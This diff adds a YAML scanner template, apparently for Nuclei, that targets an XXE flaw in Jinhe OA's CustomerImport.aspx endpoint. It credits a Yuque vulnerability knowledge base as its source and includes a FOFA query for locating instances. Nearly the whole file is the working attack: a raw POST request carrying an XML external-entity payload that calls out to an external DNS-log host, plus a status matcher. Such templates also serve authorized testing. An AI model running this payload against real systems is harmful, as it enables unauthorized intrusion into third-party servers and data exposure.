@@ -1,0 +1,32 @@
+id: poc-dkmb0crdugffgwzk
+info:
+  name: 金和OA CustomerImport.aspx 存在XXE漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/dkmb0crdugffgwzk'
+  tags: xxe,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: dkmb0crdugffgwzk
+    fofa: app="金和网络-金和OA"
+http:
+- raw:
+  - 'POST /c6/JHSoft.Web.ContractManagement/Importing/CustomerImport.aspx/ HTTP/1.1
+
+    Host: {{Hostname}}
+
+
+    <?xml version="1.0" encoding="UTF-8"?>
+
+    <!DOCTYPE root [
+
+    <!ENTITY % remote SYSTEM "http://xxe.dnslog.pt/xxe_test">
+
+    %remote;]>
+
+    <root/>'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
